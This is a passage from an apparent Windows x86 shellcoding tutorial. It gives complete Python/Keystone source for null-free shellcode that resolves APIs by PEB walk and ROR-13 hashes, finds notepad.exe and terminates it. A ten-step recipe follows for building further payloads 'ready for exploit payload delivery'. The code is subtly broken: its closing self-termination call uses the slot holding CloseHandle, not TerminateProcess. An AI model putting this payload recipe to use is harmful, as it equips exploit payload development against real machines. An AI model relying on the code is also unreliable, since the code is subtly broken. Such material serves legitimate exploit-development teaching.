  <rect width="750" height="300" rx="10" fill="url(#bg_s2001)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s2001)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s2001)" font-weight="bold">Process Enumeration &amp; Termination Loop</text>

  <!-- Snapshot -->
  <rect x="50" y="48" width="190" height="45" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="145" y="67" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">CreateToolhelp32Snapshot</text>
  <text x="145" y="84" text-anchor="middle" fill="#e0e7ff" font-size="10">TH32CS_SNAPPROCESS</text>
  <line x1="240" y1="70" x2="258" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s2001)"/>

  <!-- Process32First -->
  <rect x="263" y="48" width="140" height="45" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="333" y="67" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Process32First</text>
  <text x="333" y="84" text-anchor="middle" fill="#e0e7ff" font-size="10">get first entry</text>
  <line x1="403" y1="70" x2="421" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s2001)"/>

  <!-- Detection loop -->
  <rect x="426" y="48" width="290" height="45" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="571" y="67" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">Detection Loop</text>
  <text x="571" y="84" text-anchor="middle" fill="#e0e7ff" font-size="10">compare szExeFile with "notepad.exe"</text>

  <!-- Loop back arrow for Process32Next -->
  <path d="M716,93 L716,115 L475,115 L475,100" stroke="#8b949e" stroke-width="1.5" fill="none" stroke-dasharray="4,3" marker-end="url(#arr_s2001)"/>
  <text x="600" y="112" fill="#8b949e" font-size="9">Process32Next (no match)</text>

  <!-- Match found arrow -->
  <line x1="571" y1="93" x2="571" y2="143" stroke="#00ff88" stroke-width="2" marker-end="url(#arr_s2001)"/>
  <text x="610" y="133" fill="#00ff88" font-size="9" font-weight="bold">MATCH!</text>

  <!-- PID extraction -->
  <rect x="426" y="148" width="290" height="35" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="571" y="170" text-anchor="middle" fill="#00ff88" font-size="11">Extract PID from [edi+0x08]</text>
  <line x1="571" y1="183" x2="571" y2="203" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s2001)"/>

  <!-- OpenProcess -->
  <rect x="426" y="208" width="140" height="35" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="496" y="230" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">OpenProcess</text>
  <line x1="566" y1="225" x2="584" y2="225" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s2001)"/>

  <!-- TerminateProcess -->
  <rect x="589" y="208" width="130" height="35" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="654" y="230" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">Terminate!</text>

  <!-- PROCESSENTRY32 struct detail -->
  <rect x="50" y="120" width="350" height="125" rx="6" fill="#0d1117" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="225" y="140" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">PROCESSENTRY32 (556 bytes)</text>
  <text x="70" y="160" fill="#8b949e" font-size="10">[+0x00] dwSize = 0x22C</text>
  <text x="70" y="176" fill="#ff6b35" font-size="10">[+0x08] th32ProcessID → target PID</text>
  <text x="70" y="192" fill="#8b949e" font-size="10">[+0x14] th32ParentProcessID</text>
  <text x="70" y="208" fill="#ff3366" font-size="10">[+0x24] szExeFile → "notepad.exe"</text>
  <text x="70" y="230" fill="#8b949e" font-size="9">DWORD compare: "note" (0x65746f6e) + "pad." (0x2e646170)</text>
</svg></div>

*Figure 20.1 -- Process enumeration loop. The shellcode snapshots all processes, iterates with Process32First/Next, compares szExeFile DWORD-by-DWORD against "notepad.exe", extracts the PID, and terminates the matching process.*

### Step 7: Self-Termination

After killing the target, the shellcode exits:

```nasm
call_terminateprocess:
    xor   eax, eax
    push  eax                     ; uExitCode = 0
    dec   eax                     ; EAX = -1 (current process)
    push  eax                     ; hProcess = -1
    call  dword ptr [ebp+0x24]   ; TerminateProcess(-1, 0)
```

### Complete Process Termination Flow

<div align="center"><svg viewBox="0 0 750 170" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s2002" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s2002"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s2002" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s2002" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="170" rx="10" fill="url(#bg_s2002)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s2002)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s2002)" font-weight="bold">Process Termination Pipeline</text>

  <rect x="20" y="50" width="100" height="40" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="70" y="66" text-anchor="middle" fill="#00d4ff" font-size="9" font-weight="bold">Resolve</text>
  <text x="70" y="80" text-anchor="middle" fill="#e0e7ff" font-size="8">6 APIs</text>
  <line x1="120" y1="70" x2="133" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s2002)"/>

  <rect x="138" y="50" width="105" height="40" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="190" y="66" text-anchor="middle" fill="#ff6b35" font-size="9" font-weight="bold">Snapshot</text>
  <text x="190" y="80" text-anchor="middle" fill="#e0e7ff" font-size="8">all processes</text>
  <line x1="243" y1="70" x2="256" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s2002)"/>

  <rect x="261" y="50" width="100" height="40" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="311" y="66" text-anchor="middle" fill="#ff6b35" font-size="9" font-weight="bold">Enumerate</text>
  <text x="311" y="80" text-anchor="middle" fill="#e0e7ff" font-size="8">P32First/Next</text>
  <line x1="361" y1="70" x2="374" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s2002)"/>

  <rect x="379" y="50" width="100" height="40" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="429" y="66" text-anchor="middle" fill="#ff3366" font-size="9" font-weight="bold">Find Target</text>
  <text x="429" y="80" text-anchor="middle" fill="#e0e7ff" font-size="8">notepad.exe</text>
  <line x1="479" y1="70" x2="492" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s2002)"/>

  <rect x="497" y="50" width="100" height="40" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="547" y="66" text-anchor="middle" fill="#ff3366" font-size="9" font-weight="bold">OpenProcess</text>
  <text x="547" y="80" text-anchor="middle" fill="#e0e7ff" font-size="8">TERMINATE</text>
  <line x1="597" y1="70" x2="610" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s2002)"/>

  <rect x="615" y="50" width="110" height="40" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="670" y="66" text-anchor="middle" fill="#00ff88" font-size="9" font-weight="bold">Kill + Exit</text>
  <text x="670" y="80" text-anchor="middle" fill="#e0e7ff" font-size="8">terminate both</text>

  <rect x="50" y="110" width="650" height="45" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="130" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Targeted Process Kill</text>
  <text x="375" y="148" text-anchor="middle" fill="#8b949e" font-size="10">Snapshot → Enumerate → Match "notepad.exe" → OpenProcess(PROCESS_TERMINATE) → TerminateProcess</text>
</svg></div>

*Figure 20.2 -- Process termination pipeline. The Toolhelp32 snapshot is enumerated to find notepad.exe by name, then OpenProcess acquires a terminate handle and TerminateProcess kills it.*

### Full Shellcode Source (`process_terminator.py`)

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "
    "   mov   ebp, esp                  ;"
    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   modulename[12] == 0x00?
    "   jne   next_module               ;"

    " find_function_shorten:             "
    "   jmp find_function_shorten_bnc   ;"

    " find_function_ret:                 "
    "   pop esi                         ;"
    "   mov   [ebp+0x04], esi           ;"
    "   jmp resolve_symbols_kernel32    ;"

    " find_function_shorten_bnc:         "
    "   call find_function_ret          ;"

    " find_function:                     "
    "   pushad                          ;"
    "   mov   eax, [ebx+0x3c]           ;"
    "   mov   edi, [ebx+eax+0x78]       ;"
    "   add   edi, ebx                  ;"
    "   mov   ecx, [edi+0x18]           ;"
    "   mov   eax, [edi+0x20]           ;"
    "   add   eax, ebx                  ;"
    "   mov   [ebp-4], eax              ;"

    " find_function_loop:                "
    "   jecxz find_function_finished    ;"
    "   dec   ecx                       ;"
    "   mov   eax, [ebp-4]              ;"
    "   mov   esi, [eax+ecx*4]          ;"
    "   add   esi, ebx                  ;"

    " compute_hash:                      "
    "   xor   eax, eax                  ;"
    "   cdq                             ;"
    "   cld                             ;"

    " compute_hash_again:                "
    "   lodsb                           ;"
    "   test  al, al                    ;"
    "   jz    compute_hash_finished     ;"
    "   ror   edx, 0x0d                 ;"
    "   add   edx, eax                  ;"
    "   jmp   compute_hash_again        ;"

    " compute_hash_finished:             "

    " find_function_compare:             "
    "   cmp   edx, [esp+0x24]           ;"
    "   jnz   find_function_loop        ;"
    "   mov   edx, [edi+0x24]           ;"
    "   add   edx, ebx                  ;"
    "   mov   cx,  [edx+2*ecx]          ;"
    "   mov   edx, [edi+0x1c]           ;"
    "   add   edx, ebx                  ;"
    "   mov   eax, [edx+4*ecx]          ;"
    "   add   eax, ebx                  ;"
    "   mov   [esp+0x1c], eax           ;"

    " find_function_finished:            "
    "   popad                           ;"
    "   ret                             ;"

    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x10], eax           ;"
    "   push  0xe454dfed                ;"  #   CreateToolhelp32Snapshot
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x14], eax           ;"
    "   push  0x3249baa7                ;"  #   Process32First
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x18], eax           ;"
    "   push  0x4776654a                ;"  #   Process32Next
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x1C], eax           ;"
    "   push  0xefe297c0                ;"  #   OpenProcess
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x20], eax           ;"
    "   push  0x0ffd97fb                ;"  #   CloseHandle
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x24], eax           ;"

    " call_createtoolhelp32snapshot:     "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   th32ProcessID = 0
    "   inc   eax                       ;"
    "   inc   eax                       ;"  #   EAX = 2
    "   push  eax                       ;"  #   TH32CS_SNAPPROCESS
    "   call  dword ptr [ebp+0x14]      ;"
    "   mov   [ebp+0x2C], eax           ;"  #   save snapshot handle

    " set_struct_size:                   "
    "   xor   eax, eax                  ;"
    "   xor   ecx, ecx                  ;"
    "   mov   cx,  0x22C                ;"  #   556 bytes

    " allocate_struct:                   "
    "   push  eax                       ;"  #   push 4 zero bytes
    "   sub   ecx, 0x04                 ;"
    "   jnz   allocate_struct           ;"
    "   mov   edi,  esp                 ;"  #   EDI → PROCESSENTRY32

    " set_req_parameters:                "
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x22C                 ;"
    "   mov   [edi], eax                ;"  #   dwSize = 0x22C

    " call_process32first:               "
    "   push  edi                       ;"  #   lppe
    "   push  [ebp+0x2C]                ;"  #   hSnapshot
    "   call  dword ptr [ebp+0x18]      ;"  #   Process32First

    " create_notepad_string:             "
    "   xor   eax, eax                  ;"
    "   mov   ax,  0x6578               ;"  #   "xe"
    "   shl   eax, 0x08                 ;"
    "   mov   al,  0x65                 ;"  #   → "exe\0"
    "   push  eax                       ;"
    "   push  0x2e646170                ;"  #   "pad."
    "   push  0x65746f6e                ;"  #   "note"
    "   mov   [ebp+0x30], esp           ;"  #   save "notepad.exe" ptr

    " detection_loop:                    "
    "   xor   ecx, ecx                  ;"
    "   mov   eax, [edi+0x24]           ;"  #   szExeFile[0..3]
    "   cmp   eax, 0x65746f6e           ;"  #   "note"
    "   jne   next_process              ;"
    "   mov   eax, [edi+0x28]           ;"
    "   cmp   eax, 0x2e646170           ;"  #   "pad."
    "   jne   next_process              ;"
    "   mov   eax, [edi+0x08]           ;"  #   th32ProcessID
    "   jmp   kill_process              ;"

    " next_process:                      "
    "   push  edi                       ;"  #   lppe
    "   push  [ebp+0x2C]                ;"  #   hSnapshot
    "   call  dword ptr [ebp+0x1C]      ;"  #   Process32Next
    "   test  eax, eax                  ;"
    "   jnz   detection_loop            ;"
    "   jmp   call_terminateprocess     ;"  #   not found

    " kill_process:                      "
    "   push  eax                       ;"  #   dwProcessId
    "   xor   ecx, ecx                  ;"
    "   push  ecx                       ;"  #   bInheritHandle = FALSE
    "   inc   ecx                       ;"  #   PROCESS_TERMINATE = 1
    "   push  ecx                       ;"  #   dwDesiredAccess
    "   call  dword ptr [ebp+0x20]      ;"  #   OpenProcess
    "   xor   ecx, ecx                  ;"
    "   push  ecx                       ;"  #   uExitCode = 0
    "   push  eax                       ;"  #   hProcess
    "   call  dword ptr [ebp+0x10]      ;"  #   TerminateProcess

    " call_terminateprocess:             "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   uExitCode = 0
    "   dec   eax                       ;"  #   EAX = -1
    "   push  eax                       ;"  #   hProcess = -1
    "   call  dword ptr [ebp+0x24]      ;"  #   TerminateProcess(-1, 0)
)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

shellcode = bytes(encoding)
shellcode_str = ''.join(f'\\x{b:02x}' for b in shellcode)
print(f"[+] Generated Shellcode: {shellcode_str}")
print(f"[+] Shellcode length: {len(shellcode)} bytes")
```

### PoC Video

The following video demonstrates the process termination shellcode finding and killing `notepad.exe`:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/process-terminator-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: Process termination shellcode killing notepad.exe*

---


## 21. The Complete Development Workflow

Here is the end-to-end recipe for building any new shellcode payload from scratch.

**Step 1 -- Identify Required APIs.** Write the high-level logic in C pseudocode. List every Windows API and its DLL.

**Step 2 -- Compute ROR-13 Hashes.** Run each API name through the hash script. Double-check each hash.

**Step 3 -- Write the Skeleton.** Copy the reusable skeleton: `mov ebp, esp` / `add esp, 0xfffff9f0` / PEB walk / find_function.

**Step 4 -- Resolve APIs.** Push hash, call find_function, store at `[ebp+N]`. Keep a comment table mapping offsets to names.

**Step 5 -- Load Additional DLLs.** Call `LoadLibraryA`, swap base into EBX, resolve exports from the new DLL.

**Step 6 -- Build Payload Logic.** Construct strings and structs on the stack, push arguments right-to-left, call function pointers.

**Step 7 -- Eliminate Bad Characters.** Audit assembled bytes. Apply encoding patterns from Section 5.

**Step 8 -- Assemble and Test.** Keystone to assemble, bad char scanner to verify, ctypes harness to execute.

**Step 9 -- Debug in WinDbg.** Place `int3`, attach WinDbg, single-step, verify register values and stack layout.

**Step 10 -- Iterate.** Fix, reassemble, retest. Each cycle gets faster as your pattern library grows.

<div align="center"><svg viewBox="0 0 750 440" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s216" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s216"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s216" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="ah20" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  <marker id="ah20d" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00d4ff"/></marker>
  <linearGradient id="bg_s54" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
  <filter id="glow_s54"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
  <linearGradient id="line_s54" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
</defs>
<rect width="750" height="440" rx="10" fill="url(#bg_s54)"/>
<rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s54)"/>
<text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold" filter="url(#glow_s54)">Shellcode Development Pipeline</text>
<!-- Row 1 -->
<rect x="30" y="50" width="140" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="100" y="72" fill="#00d4ff" font-size="11" text-anchor="middle" font-weight="bold">1. Identify APIs</text>
<text x="100" y="92" fill="#e0e7ff" font-size="9" text-anchor="middle">C pseudocode first</text>
<line x1="170" y1="77" x2="195" y2="77" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="200" y="50" width="140" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="270" y="72" fill="#00d4ff" font-size="11" text-anchor="middle" font-weight="bold">2. Hash Names</text>
<text x="270" y="92" fill="#e0e7ff" font-size="9" text-anchor="middle">ROR-13 script</text>
<line x1="340" y1="77" x2="365" y2="77" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="370" y="50" width="150" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="445" y="72" fill="#00d4ff" font-size="11" text-anchor="middle" font-weight="bold">3. Skeleton</text>
<text x="445" y="92" fill="#e0e7ff" font-size="9" text-anchor="middle">EBP + stack + PEB</text>
<line x1="520" y1="77" x2="545" y2="77" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="550" y="50" width="170" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="635" y="72" fill="#00d4ff" font-size="11" text-anchor="middle" font-weight="bold">4. Resolve APIs</text>
<text x="635" y="92" fill="#e0e7ff" font-size="9" text-anchor="middle">push hash, call, store</text>
<!-- Row 2 -->
<line x1="635" y1="105" x2="635" y2="130" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="550" y="135" width="170" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="635" y="157" fill="#00d4ff" font-size="11" text-anchor="middle" font-weight="bold">5. Load DLLs</text>
<text x="635" y="177" fill="#e0e7ff" font-size="9" text-anchor="middle">LoadLibraryA + resolve</text>
<line x1="550" y1="162" x2="505" y2="162" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="340" y="135" width="160" height="55" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
<text x="420" y="157" fill="#ff3366" font-size="11" text-anchor="middle" font-weight="bold">6. Payload Logic</text>
<text x="420" y="177" fill="#e0e7ff" font-size="9" text-anchor="middle">Strings, structs, calls</text>
<line x1="340" y1="162" x2="295" y2="162" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="130" y="135" width="160" height="55" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
<text x="210" y="157" fill="#ff6b35" font-size="11" text-anchor="middle" font-weight="bold">7. Kill Bad Chars</text>
<text x="210" y="177" fill="#e0e7ff" font-size="9" text-anchor="middle">XOR/NOT/SHL/NEG</text>
<!-- Row 3 -->
<line x1="210" y1="190" x2="210" y2="220" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="130" y="225" width="160" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
<text x="210" y="247" fill="#00ff88" font-size="11" text-anchor="middle" font-weight="bold">8. Assemble + Test</text>
<text x="210" y="267" fill="#e0e7ff" font-size="9" text-anchor="middle">Keystone + ctypes</text>
<line x1="290" y1="252" x2="350" y2="252" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="355" y="225" width="160" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
<text x="435" y="247" fill="#00ff88" font-size="11" text-anchor="middle" font-weight="bold">9. Debug</text>
<text x="435" y="267" fill="#e0e7ff" font-size="9" text-anchor="middle">WinDbg + int3</text>
<line x1="515" y1="252" x2="575" y2="252" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="580" y="225" width="140" height="55" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
<text x="650" y="247" fill="#ff3366" font-size="11" text-anchor="middle" font-weight="bold">10. Iterate</text>
<text x="650" y="267" fill="#e0e7ff" font-size="9" text-anchor="middle">Fix + retest</text>
<!-- Loop arrow from 10 back to 7 -->
<path d="M 650,280 C 650,330 210,330 210,225" fill="none" stroke="#00d4ff" stroke-width="2" stroke-dasharray="8,4" marker-end="url(#ah20d)"/>
<text x="430" y="325" fill="#00d4ff" font-size="10" text-anchor="middle">Iterate until clean</text>
<!-- Bottom note -->
<rect x="150" y="370" width="450" height="50" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
<text x="375" y="392" fill="#e0e7ff" font-size="11" text-anchor="middle">Each cycle takes under a minute once the tooling is set up.</text>
<text x="375" y="410" fill="#00ff88" font-size="10" text-anchor="middle">Build a library of tested blocks to accelerate new payloads.</text>
</svg></div>

*Figure 21.1 - The 10-step shellcode development pipeline. Steps 7-10 form an inner loop that repeats until all bad characters are eliminated and the payload works correctly.*

<div align="center"><svg viewBox="0 0 750 310" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s217" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s217"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s217" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="ta20" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
    <marker id="tb20" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00d4ff"/></marker>
    <marker id="tc20" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#ff6b35"/></marker>
      <linearGradient id="bg_s212" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s212"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s212" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="310" rx="10" fill="url(#bg_s212)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s212)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s217)" font-weight="bold">Shellcode Development Tooling Ecosystem</text>
  <!-- Center: shellcode.asm -->
  <rect x="280" y="100" width="190" height="75" rx="8" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="375" y="125" text-anchor="middle" fill="#ff3366" font-size="13" font-weight="bold">shellcode.asm</text>
  <text x="375" y="145" text-anchor="middle" fill="#e0e7ff" font-size="10">Your x86 assembly payload</text>
  <text x="375" y="162" text-anchor="middle" fill="#8b949e" font-size="9">The single source of truth</text>
  <!-- Left: Python tools -->
  <rect x="20" y="45" width="210" height="185" rx="8" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="125" y="70" text-anchor="middle" fill="#00d4ff" font-size="13" font-weight="bold">Python Toolchain</text>
  <line x1="40" y1="80" x2="210" y2="80" stroke="#8b949e" stroke-width="0.5"/>
  <text x="40" y="100" fill="#00ff88" font-size="10">Keystone</text><text x="130" y="100" fill="#8b949e" font-size="9">assembler</text>
  <text x="40" y="120" fill="#00ff88" font-size="10">hash.py</text><text x="130" y="120" fill="#8b949e" font-size="9">ROR-13 hashes</text>
  <text x="40" y="140" fill="#00ff88" font-size="10">ctypes</text><text x="130" y="140" fill="#8b949e" font-size="9">test harness</text>
  <text x="40" y="160" fill="#00ff88" font-size="10">badchar.py</text><text x="130" y="160" fill="#8b949e" font-size="9">byte scanner</text>
  <text x="40" y="180" fill="#00ff88" font-size="10">struct</text><text x="130" y="180" fill="#8b949e" font-size="9">pack helpers</text>
  <rect x="40" y="195" width="170" height="22" rx="5" fill="#0d1117" stroke="#00d4ff" stroke-width="1"/>
  <text x="125" y="211" text-anchor="middle" fill="#00d4ff" font-size="9">Assemble -> Scan -> Inject</text>
  <!-- Right: WinDbg -->
  <rect x="520" y="55" width="210" height="160" rx="8" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="625" y="80" text-anchor="middle" fill="#ff6b35" font-size="13" font-weight="bold">WinDbg</text>
  <line x1="540" y1="90" x2="710" y2="90" stroke="#8b949e" stroke-width="0.5"/>
  <text x="540" y="110" fill="#e0e7ff" font-size="10">int3 breakpoints</text>
  <text x="540" y="130" fill="#e0e7ff" font-size="10">Register inspection</text>
  <text x="540" y="150" fill="#e0e7ff" font-size="10">Stack layout view</text>
  <text x="540" y="170" fill="#e0e7ff" font-size="10">Memory dumps</text>
  <text x="540" y="190" fill="#e0e7ff" font-size="10">Single-step execution</text>
  <!-- Arrows: ASM -> Python (assemble) -->
  <line x1="280" y1="125" x2="235" y2="100" stroke="#00d4ff" stroke-width="1.5" marker-end="url(#tb20)"/>
  <text x="245" y="98" fill="#00d4ff" font-size="8">assemble</text>
  <!-- Arrow: Python -> center (bytes) -->
  <line x1="230" y1="145" x2="278" y2="140" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ta20)"/>
  <text x="245" y="155" fill="#00ff88" font-size="8">bytes</text>
  <!-- Arrow: center -> WinDbg (inject + debug) -->
  <line x1="470" y1="125" x2="518" y2="105" stroke="#ff6b35" stroke-width="1.5" marker-end="url(#tc20)"/>
  <text x="498" y="100" fill="#ff6b35" font-size="8">inject</text>
  <!-- Arrow: WinDbg -> center (fix) -->
  <line x1="520" y1="155" x2="472" y2="150" stroke="#ff3366" stroke-width="1.5" stroke-dasharray="6,3"/>
  <text x="498" y="165" fill="#ff3366" font-size="8">fix bugs</text>
  <!-- Bottom: output -->
  <rect x="200" y="250" width="350" height="40" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="375" y="268" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">Final: shellcode.bin (clean, tested, null-free)</text>
  <text x="375" y="283" text-anchor="middle" fill="#8b949e" font-size="9">Ready for exploit payload delivery</text>
  <!-- Arrow down -->
